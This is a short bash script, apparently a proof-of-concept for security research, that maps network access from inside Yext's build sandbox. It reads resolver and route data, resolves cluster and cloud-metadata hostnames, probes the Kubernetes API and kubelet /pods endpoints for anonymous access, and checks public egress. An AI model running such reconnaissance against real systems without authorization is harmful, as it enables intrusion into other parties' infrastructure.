#!/usr/bin/env bash
# Internal network position from inside the Yext build sandbox.
# READ-ONLY, targeted (no port sweep, no mutating calls, short timeouts).
set +e
B="YEXTPOC7731"; echo "$B-BEGIN"

echo "$B === 1. NETWORK CONTEXT ==="
cat /etc/resolv.conf 2>&1
ip -4 addr 2>/dev/null | grep -E 'inet ' || hostname -i 2>&1
ip route 2>/dev/null | head -5

echo "$B === 2. CLUSTER DNS RESOLUTION ==="
for N in kubernetes.default.svc.cluster.local kubernetes.default \
         kube-dns.kube-system.svc.cluster.local metadata.google.internal; do
  printf '%-48s ' "$N"
  getent hosts "$N" 2>&1 | head -1 || echo "(no resolve)"
done

echo "$B === 3. KUBERNETES API REACHABLE / ANONYMOUS? ==="
for U in https://kubernetes.default.svc/version \
         https://kubernetes.default.svc/api \
         https://10.0.0.1/version; do
  printf '%-44s ' "$U"
  curl -sk -m 8 -o - -w ' [HTTP %{http_code}]' "$U" 2>&1 | tr -d '\n' | head -c 220; echo
done

echo "$B === 4. KUBELET ON THE NODE (anonymous read?) ==="
NODE_IP=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
echo "gateway/node-ip guess = $NODE_IP"
for P in 10250 10255; do
  printf 'kubelet %s:%s  ' "$NODE_IP" "$P"
  curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' "https://$NODE_IP:$P/pods" 2>&1 | tr -d '\n' | head -c 200; echo
done

echo "$B === 5. EGRESS: can we even reach the public internet? (control) ==="
printf 'example.com  '; curl -s -m 8 -o /dev/null -w '[HTTP %{http_code}]\n' https://example.com 2>&1
printf 'github.com   '; curl -s -m 8 -o /dev/null -w '[HTTP %{http_code}]\n' https://github.com 2>&1

echo "$B-END"; exit 0
